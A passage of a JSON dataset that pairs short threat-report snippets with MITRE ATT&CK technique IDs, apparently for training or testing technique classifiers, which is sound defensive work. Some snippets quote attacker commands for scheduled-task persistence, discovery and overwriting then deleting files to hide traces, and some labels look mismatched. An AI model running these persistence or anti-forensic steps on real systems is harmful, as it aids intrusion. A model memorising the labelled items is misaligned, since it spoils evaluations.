    "text": "ran another round of discovery activity with native windows utilities",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can add directories used by the malware to the Windows Defender exclusions list to prevent detection.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "searches attached and mounted drives for file extensions and keywords that match a predefined list.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.(Citation: Proofpoint Leviathan Oct 2017)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can access the HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData Registry key to obtain the System manufacturer value to identify the machine type.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can use LoadLibraryW and CreateProcess to load and execute code.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The packet data was customized and sent through a POST request with several headers towards the C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can download further malware for execution on the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "it writes a batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "done via the GetAsyncKeyState API,",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The fields required for HTTP",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "or download additional stages.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use HTTP in communication with C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor executed a batch script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can delete its configuration file from the targeted system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download additional files for execution on the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has created admin accounts on a compromised host.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors began discovery tasks using Windows utilities",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "perform a\nnumber of changes on the filesystem or registry,",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has relied on victim's executing malicious file attachments delivered via email or embedded within actor-controlled websites to deliver malware.(Citation: SecureWorks August 2019)(Citation: Dragos Hexane)(Citation: ClearSky Siamesekitten August 2021)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has searched local system resources to access sensitive documents.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor established RDP sessions to internal servers",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "facilitates the functionality of WMI in Windows",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used a AMSI bypass which patches the in-memory amsi.dll in PowerShell scripts to bypass Windows antimalware products.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has injected malicious DLLs into memory with read write and execute permissions.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used a batch script that adds a Registry Run key to establish malware persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "executes the shell (file2.bat),",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The use of RDP was extensively used throughout the intrusion, using a variety of processes",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "SELECT * FROM Win32_ComputerSystem",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used malicious files including VBS LNK and HTML for execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence through a scheduled task using the command: /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR named WinUpdate.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute a file from given URL.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On execution, the tool injects itself into lsass.exe and is triggered with the argument “dig”",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "uses the Windows API call CreateProcessW() to manage execution flow.(Citation: S2 Grupo TrickBot June 2017)  has also used Nt* API functions to perform .",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries.(Citation: CrowdStrike Ryuk January 2019) ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP to download previously staged shellcode payloads.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can check the default browser by querying HKCR\\http\\shell\\open\\command.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "indicating the use of Remote Desktop Protocol.[",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "specifies a path to store files scheduled for exfiltration. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "requires the user to click on the malicious Word document to execute the next part of the attack. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "adds the configuration to the Registry in XML format.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has been seen using RDP for lateral movement and persistence in some cases employing the rdpwinst tool for mangement of multiple sessions.(Citation: FireEye APT39 Jan 2019)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "uses Rundll32 to ensure only a single instance of itself is running at once.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to gather the OS version and computer name.(Citation: Talos Cobalt Group July 2018)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "uses the function kill_unwanted to obtain a list of running processes and kills each process matching a list of security related processes.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "modifies the firewall Registry key SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\\\List.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32 for execution.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has used a tool to enumerate proxy settings in the target environment.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "is capable of retrieving information about the infected system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "registers a new scheduled task to trigger every day and repeat every hour with option “d” as an argument.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can delete its configuration file after installation.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "During  various implants used batch scripting and `cmd.exe` for execution. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has collected hardware details for the victim's system including CPU and memory information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "GetSystemTimeAsFileTime Api call",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "uses WMIC to identify anti-virus products installed on the victims machine and to obtain firewall details.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "uses the nbtstat -n and nbtstat -s commands on the victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Creates a service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "A multilayered approach is a must to securing the organization’s perimeter, especially for information security professionals and system/IT administrators",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has collected data and files from a compromised host.(Citation: BlackBerry CostaRicto November 2020)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "After reestablishing access, the adversaries download tools such as gsecudmp and WCE that are staged temporarily on websites that TG-3390 previously compromised but never used",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The API function located at the beginning of the memory section are resolved using GetProcAddress",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used  a RAT that uses HTTP to communicate.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "drop batch files",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "As tasklist uses WMI “under the hood,",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Credentials that have either been reused across multiple platforms or have previously been exposed",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.(Citation: Symantec Remsec IOCs)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "requires the user to double-click the executable to run the malicious HTA file or to download a malicious installer.(Citation: FireEye Metamorfo Apr 2018) ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can install itself as a service. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The body of the POST request may contain files contained in the cabinet format",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "added to the startup folder",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "collects data in a plaintext file named r1.log before exfiltration. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can use various API calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "runs tasklist to obtain running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "to load the final payload into memory from a Registry value without",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has been seen injecting a DLL into winword.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "gathers product names from the Registry key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductName and the processor description from the Registry key HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "a separate service was created for that agent.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors discovered the local disks attached to the system and their hardware information including manufacturer and model as well as the OS versions of systems connected to a targeted network.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: FireEye MuddyWater Mar 2018)(Citation: Securelist MuddyWater Oct 2018)(Citation: Talos MuddyWater May 2019)(Citation: ClearSky MuddyWater June 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)(Citation: DHS CISA AA22-055A MuddyWater February 2022) ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the Windows task XML",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download files from C2 to the infected host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "collects information on network settings and Internet proxy settings from the victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "used WMI for the remote execution of files for lateral movement.(Citation: Microsoft 365 Defender Solorigate)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has relied on users clicking a malicious attachment delivered through spearphishing.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can collect the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has created Windows tasks to establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can gather a list of processes running on the machine. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "schtasks /run",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "upon initiation of the WMI service",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "to escalate privileges using valid accounts",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence by being copied to the Startup directory or through the `\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` registry key.(Citation: Malwarebytes Saint Bot April 2021)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can execute enum to enumerate files in storage on a compromised system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "creates a batch script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "deletes its RAT installer file as it executes its DLL payload file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used a payload that removes itself after running.  also has deleted locally staged files for collecting credentials or scan results for local IP addresses after exfiltrating them.(Citation: ATT TeamTNT Chimaera September 2020)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This file was opened during their RDP session and contained the PowerShell commands used to launch a new beacon:",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows discovery commands",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can collect the hostname keyboard layout and language from the system. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has deployed payloads that use Windows API calls on a compromised host.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "exe└──cmd.exe: C:\\Windows\\system32\\cmd.exe /c \"\"rdp.bat\"",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can launch a console process (cmd.exe) with redirected standard input and output.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This directory will also contain the process id of the running malware in process.id and a “build name” (as it is called by the author) in build.id",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "that pulls the written data from the registry under HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\<registry_value>>",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "after completing RDP connections to various hosts on the network",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "will check if the running processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used batch script files to automate execution and deployment of payloads.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate files on a target system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "may be abused by adversaries to transfer tools or files from an external system into a compromised environment.(Citation: Microsoft FTP)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz allows the user to manipulate the dumped credentials,",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "the injected code",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Windows Management Instrumentation (WMI).",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Full Report)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "executed using the Command-Line Compiler.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "monitors the free disk space on the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can determine if the OS on a compromised host is newer than Windows XP.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has collected a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "executes received commands with wmic.exe (for WMI commands). ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "establishing RDP connections",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has collected the DNS address of the infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "collected information from a compromised host.(Citation: Microsoft Analyzing Solorigate Dec 2020)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can collect information on user sessions.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": " has collected the MAC address from the victim's machine. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "uses an RPC server that contains a routine for file deletion and also removes itself from the system through a DLL export by deleting specific files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors consistently removed traces of their activity by first overwriting a file using `/c cd /d c:\\windows\\temp\\ & copy \\\\<IP ADDRESS>\\c$\\windows\\system32\\devmgr.dll \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1 /y` and then deleting the overwritten file using `/c cd /d c:\\windows\\temp\\ & del \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1`.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has communicated to hard-coded IP addresses via HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the newly injected PE",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has transferred files using the Intel Active Management Technology (AMT) Serial-over-LAN (SOL) channel.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor attempted to remotely list running processes on systems using tasklist.exe",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can upload a file to the victims machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Batch files are used",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, the ransomware binary deletes itself",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the malware tries to remove itself from the machine to avoid being detected and analyzed by security researchers",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to download and execute .exe files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the current user on the infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "creates a new service that loads a malicious driver when the system starts. When Duqu is active the operating system believes that the driver is legitimate as it has been signed with a valid private key.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can use a HTTP GET request to download its final payload.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has sent HTTP GET and POST requests to C2 servers to send information and receive instructions.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to directly inject its code into the web browser process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "collects network adapter and interface information by using the commands ipconfig /all arp -a and route print. It also collects the system's MAC address with getmac and domain configuration with net config workstation.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "queried a number of target hosts to determine the host disk drive configuration",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "used the Windows command shell to execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor uses stolen passwords from valid accounts",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments.(Citation: Securelist Darkhotel Aug 2015)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "exfiltrated over HTTP using GET requests",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "enumerates processes via the tasklist command.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used `rundll32` for execution of the loader component.(Citation: Proofpoint Bumblebee April 2022)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "various injections across hosts",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A  Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally a  custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.(Citation: ESET Turla Mosquito Jan 2018)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to set persistence using the Task Scheduler.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The  malware platform supports many standard protocols including HTTP and HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "to download next stage and execute it\"",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Process to inject into",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors downloaded additional malware and malicious scripts onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has received files from C2 and stored them in log folders beginning with the character sequence `a9850d2f`.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 4 Microsoft Word attempting to download the remote template If the C2 server is active at the time the document is opened, it will successfully retrieve the malicious macro and load it in the same Microsoft Word session",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "GetSystem creates a service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "used a malware variant called GOODLUCK to modify the registry in order to steal credentials.(Citation: FireEye APT41 Aug 2019)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "malware attempts to determine the installed version of .NET by querying the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "threat actor had knowledge of these accounts and used them on the correct systems",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "creates a new service named WmiApSrvEx to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can download files via DNS.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has created a file named startup_vrun.bat in the Startup folder of a virtual machine to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has a persistence component to write a scheduled task for the payload. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "customized for the HTTP-POST Block",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has collected data and files from compromised networks.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster RATs)(Citation: Kaspersky ThreatNeedle Feb 2021)(Citation: ClearSky Lazarus Aug 2020)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used `cmd.exe` and batch files for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "some defense evasion batch scripts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "query the Windows registry",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "threat actors used the dir command",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to collect the current logged on users username from a machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "to download and execute additional\nPowerShell code and Windows binaries",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "gathers the OS version, machine name, CPU type, amount of RAM available from the victim’s machine",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The malware queries the Windows API to get the computer name, user name, volume serial number, Windows version, processor architecture and two additional values, which are “1.3” and “KdfrJKN”",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used direct Windows system calls by leveraging Dumpert.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised credentials to log on to other systems and escalate privileges.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "two batch files were run.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses rundll32 to call an exported function.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has placed scripts in the startup folder for persistence and modified the `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce` Registry key.(Citation: Securelist Kimsuky Sept 2013)(Citation: CISA AA20-301A Kimsuky)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: Talos Kimsuky Nov 2021)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "execute commands via scheduled tasks/jobs.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "malware used Pythons urllib library to make HTTP requests to the C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Place a value on RunOnce key",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors proceeded to RDP to the domain controller.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can use additional payload types",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "dispatcher can establish persistence by registering a new service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "used WMI to steal credentials and execute backdoors at a future time.(Citation: Mandiant No Easy Breach) They have also used WMI for the remote execution of files for lateral movement.(Citation: Microsoft 365 Defender Solorigate)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "via the interactive shell",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "executing a batch-file (.bat) to perform their tasks.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the batch file to run",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can remove its log file from disk.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports.(Citation: cobaltstrike manual)(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "will delete its dropper and VBS scripts from the victims machine.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
